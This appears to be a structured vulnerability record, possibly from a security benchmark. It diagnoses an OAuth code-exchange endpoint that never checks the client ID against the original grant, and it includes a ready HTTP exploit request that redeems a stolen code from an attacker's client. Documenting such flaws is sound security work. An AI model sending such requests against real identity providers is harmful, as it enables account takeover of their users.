diagnosis: The OAuth authorization code exchange endpoint retrieves authorization grants from an in-memory LRUCache using authorizationCode without verifying that req.body.clientId matches the clientId for which the grant was originally issued. An attacker possessing an intercepted or leaked authorization code can exchange it from their own client application, completing account takeover.
exploit_request:
POST /oauth/token/exchange HTTP/1.1
Host: idp.sso-gateway.com
Content-Type: application/json

{
  "authorizationCode": "auth_code_9a8f219c0b",
  "clientId": "attacker-registered-client-app"
}
